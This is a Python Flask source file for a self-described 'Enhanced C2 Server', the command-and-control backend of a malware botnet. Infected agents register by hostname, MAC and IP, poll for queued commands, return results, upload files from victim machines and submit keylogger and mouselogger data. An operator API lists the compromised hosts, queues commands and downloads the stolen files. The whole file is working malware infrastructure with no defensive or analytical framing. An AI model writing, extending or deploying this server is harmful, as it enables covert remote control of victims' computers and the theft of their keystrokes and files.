from flask import Flask, request, jsonify, send_file
import sqlite3
import json
import os
import hashlib
import time
import threading
from datetime import datetime, timedelta
import jwt
from cryptography.fernet import Fernet
import base64
import logging
from logging.handlers import RotatingFileHandler

app = Flask(__name__)

# --- Configuration ---
C2_TOKEN = os.environ.get('C2_TOKEN', 'default_c2_token_for_dev_2024')
JWT_SECRET = os.environ.get('JWT_SECRET', 'jwt_super_secret_for_dev_2024')
# IMPORTANT: Generate a real key for production: Fernet.generate_key().decode()
ENCRYPTION_KEY_B64 = os.environ.get('ENCRYPTION_KEY_B64', base64.urlsafe_b64encode(b'a_strong_32_byte_secret_key_!!!'.ljust(32)).decode())

# --- Logging Setup ---
def setup_logging():
    logger = logging.getLogger('enhanced_c2')
    if not logger.handlers:
        logger.setLevel(logging.INFO)
        handler = RotatingFileHandler('c2_server.log', maxBytes=5*1024*1024, backupCount=3)
        formatter = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')
        handler.setFormatter(formatter)
        logger.addHandler(handler)
    return logger

logger = setup_logging()

# --- Encryption Manager ---
class EncryptionManager:
    def __init__(self, key_b64):
        self.cipher = Fernet(key_b64.encode())

    def encrypt(self, data):
        if isinstance(data, (dict, list)):
            data = json.dumps(data)
        return self.cipher.encrypt(data.encode()).decode()

    def decrypt(self, encrypted_data):
        decrypted = self.cipher.decrypt(encrypted_data.encode()).decode()
        try:
            return json.loads(decrypted)
        except json.JSONDecodeError:
            return decrypted

encryption = EncryptionManager(ENCRYPTION_KEY_B64)

# --- Database Management ---
DB_FILE = 'runtime/agents.db'

def init_db():
    with sqlite3.connect(DB_FILE) as conn:
        c = conn.cursor()
        # Agents Table
        c.execute('''CREATE TABLE IF NOT EXISTS agents
                     (id INTEGER PRIMARY KEY AUTOINCREMENT, unique_id TEXT UNIQUE, name TEXT,
                      hostname TEXT, os TEXT, ip TEXT, mac TEXT, last_seen TIMESTAMP,
                      status TEXT DEFAULT 'offline', config TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
        # Commands Table
        c.execute('''CREATE TABLE IF NOT EXISTS commands
                     (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id TEXT, command TEXT,
                      args TEXT, status TEXT DEFAULT 'pending', response TEXT, file_path TEXT,
                      created_by TEXT, created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP, completed_at TIMESTAMP)''')
        # Logs Table (for keylogger, mouselogger, etc.)
        c.execute('''CREATE TABLE IF NOT EXISTS logs
                     (id INTEGER PRIMARY KEY AUTOINCREMENT, agent_id TEXT, log_type TEXT,
                      data TEXT, timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    logger.info("Database initialized successfully.")

def get_db_connection():
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    return conn

# --- Authentication ---
def authenticate(token):
    return token == C2_TOKEN

def create_agent_token(agent_id):
    payload = {'agent_id': agent_id, 'exp': datetime.utcnow() + timedelta(days=365)}
    return jwt.encode(payload, JWT_SECRET, algorithm='HS256')

def verify_agent_token(token):
    try:
        return jwt.decode(token, JWT_SECRET, algorithms=['HS256'])
    except (jwt.ExpiredSignatureError, jwt.InvalidTokenError):
        return None

# --- Agent Endpoints ---
@app.route('/api/agent/register', methods=['POST'])
def register_agent():
    try:
        data = request.json
        mac_address = data.get('mac', 'unknown_mac')
        hostname = data.get('hostname', 'unknown_host')
        agent_id = hashlib.md5(f"{mac_address}-{hostname}".encode()).hexdigest()[:12]

        with get_db_connection() as conn:
            c = conn.cursor()
            c.execute("SELECT unique_id FROM agents WHERE unique_id = ?", (agent_id,))
            if c.fetchone():
                c.execute("UPDATE agents SET last_seen = ?, ip = ?, os = ?, status = 'online' WHERE unique_id = ?",
                          (datetime.now(), data.get('ip'), data.get('os'), agent_id))
            else:
                c.execute("INSERT INTO agents (unique_id, name, hostname, os, ip, mac, last_seen, status) VALUES (?, ?, ?, ?, ?, ?, ?, 'online')",
                          (agent_id, f"Agent-{agent_id}", hostname, data.get('os'), data.get('ip'), mac_address, datetime.now()))
        
        agent_token = create_agent_token(agent_id)
        logger.info(f"Agent Registered/Refreshed: {agent_id} ({hostname})")
        return jsonify({'agent_id': agent_id, 'token': agent_token, 'status': 'registered'})
    except Exception as e:
        logger.error(f"Registration error: {e}")
        return jsonify({'error': str(e)}), 500

@app.route('/api/agent/checkin', methods=['POST'])
def agent_checkin():
    verified = verify_agent_token(request.headers.get('X-Agent-Token'))
    if not verified: return jsonify({'error': 'Invalid token'}), 401
    
    agent_id = verified['agent_id']
    with get_db_connection() as conn:
        c = conn.cursor()
        c.execute("UPDATE agents SET last_seen = ?, status = 'online' WHERE unique_id = ?", (datetime.now(), agent_id))
        c.execute("SELECT * FROM commands WHERE agent_id = ? AND status = 'pending' ORDER BY created_at LIMIT 1", (agent_id,))
        command = c.fetchone()

    if command:
        return jsonify({
            'has_command': True, 'cmd_id': command['id'], 'command': command['command'],
            'args': json.loads(command['args']) if command['args'] else {}
        })
    return jsonify({'has_command': False})

@app.route('/api/agent/response', methods=['POST'])
def agent_response():
    verified = verify_agent_token(request.headers.get('X-Agent-Token'))
    if not verified: return jsonify({'error': 'Invalid token'}), 401
    
    data = request.json
    cmd_id = data.get('cmd_id')
    response_data = data.get('response', '')
    
    with get_db_connection() as conn:
        conn.execute("UPDATE commands SET status = 'completed', response = ?, completed_at = ? WHERE id = ?",
                     (json.dumps(response_data), datetime.now(), cmd_id))
    logger.info(f"Response received for command {cmd_id} from agent {verified['agent_id']}")
    return jsonify({'status': 'received'})

@app.route('/api/agent/logs', methods=['POST'])
def receive_logs():
    verified = verify_agent_token(request.headers.get('X-Agent-Token'))
    if not verified: return jsonify({'error': 'Invalid token'}), 401

    data = request.json
    with get_db_connection() as conn:
        conn.execute("INSERT INTO logs (agent_id, log_type, data) VALUES (?, ?, ?)",
                     (verified['agent_id'], data.get('log_type'), json.dumps(data.get('data'))))
    return jsonify({'status': 'logs_received'})

@app.route('/api/agent/upload/<int:cmd_id>', methods=['POST'])
def upload_file(cmd_id):
    verified = verify_agent_token(request.headers.get('X-Agent-Token'))
    if not verified: return jsonify({'error': 'Invalid token'}), 401
    if 'file' not in request.files: return jsonify({'error': 'No file part'}), 400

    file = request.files['file']
    if file.filename == '': return jsonify({'error': 'No selected file'}), 400

    agent_id = verified['agent_id']
    filename = f"{agent_id}_{cmd_id}_{file.filename}"
    filepath = os.path.join('uploads', filename)
    file.save(filepath)

    with get_db_connection() as conn:
        conn.execute("UPDATE commands SET status = 'completed', file_path = ?, completed_at = ? WHERE id = ?",
                     (filepath, datetime.now(), cmd_id))
    logger.info(f"File '{filename}' uploaded for command {cmd_id}")
    return jsonify({'status': 'file_uploaded', 'path': filepath})

# --- Operator (Bot) Endpoints ---
@app.route('/api/agents', methods=['GET'])
def list_agents():
    if not authenticate(request.headers.get('Authorization')): return jsonify({'error': 'Unauthorized'}), 401
    with get_db_connection() as conn:
        agents = conn.execute("SELECT unique_id, name, hostname, os, ip, last_seen, status FROM agents ORDER BY last_seen DESC").fetchall()
    return jsonify([dict(row) for row in agents])

@app.route('/api/command', methods=['POST'])
def send_command():
    if not authenticate(request.headers.get('Authorization')): return jsonify({'error': 'Unauthorized'}), 401
    data = request.json
    with get_db_connection() as conn:
        cursor = conn.execute("INSERT INTO commands (agent_id, command, args, created_by) VALUES (?, ?, ?, ?)",
                              (data['agent_id'], data['command'], json.dumps(data.get('args', {})), data.get('requester', 'api')))
        cmd_id = cursor.lastrowid
    logger.info(f"Command '{data['command']}' queued for agent {data['agent_id']} (CMD ID: {cmd_id})")
    return jsonify({'cmd_id': cmd_id, 'status': 'queued'})

@app.route('/api/command/<int:cmd_id>', methods=['GET'])
def get_command_result(cmd_id):
    if not authenticate(request.headers.get('Authorization')): return jsonify({'error': 'Unauthorized'}), 401
    with get_db_connection() as conn:
        command = conn.execute("SELECT * FROM commands WHERE id = ?", (cmd_id,)).fetchone()
    if not command: return jsonify({'error': 'Command not found'}), 404
    return jsonify(dict(command))

@app.route('/api/download/<int:cmd_id>')
def download_result_file(cmd_id):
    if not authenticate(request.args.get('token')): return jsonify({'error': 'Unauthorized'}), 401
    with get_db_connection() as conn:
        cmd = conn.execute("SELECT file_path FROM commands WHERE id = ?", (cmd_id,)).fetchone()
    if not cmd or not cmd['file_path'] or not os.path.exists(cmd['file_path']):
        return jsonify({'error': 'File not found'}), 404
    return send_file(cmd['file_path'], as_attachment=True)

@app.route('/api/logs/<agent_id>', methods=['GET'])
def get_agent_logs(agent_id):
    if not authenticate(request.headers.get('Authorization')): return jsonify({'error': 'Unauthorized'}), 401
    limit = request.args.get('limit', 20, type=int)
    with get_db_connection() as conn:
        logs = conn.execute("SELECT log_type, data, timestamp FROM logs WHERE agent_id = ? ORDER BY timestamp DESC LIMIT ?", (agent_id, limit)).fetchall()
    return jsonify([dict(row) for row in logs])

# --- System & Maintenance ---
@app.route('/api/health')
def health_check():
    return jsonify({'status': 'healthy', 'version': '2.1.0', 'timestamp': datetime.now().isoformat()})

def cleanup_agents():
    while True:
        try:
            with get_db_connection() as conn:
                cutoff = datetime.now() - timedelta(minutes=5)
                res = conn.execute("UPDATE agents SET status = 'offline' WHERE last_seen < ?", (cutoff,))
                if res.rowcount > 0:
                    logger.info(f"Marked {res.rowcount} agents as offline.")
        except Exception as e:
            logger.error(f"Cleanup error: {e}")
        time.sleep(60) # Run every minute

@app.before_first_request
def startup():
    os.makedirs('runtime', exist_ok=True)
    os.makedirs('uploads', exist_ok=True)
    init_db()
    threading.Thread(target=cleanup_agents, daemon=True).start()
    logger.info("Enhanced C2 Server started successfully.")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=os.environ.get('PORT', 5000))
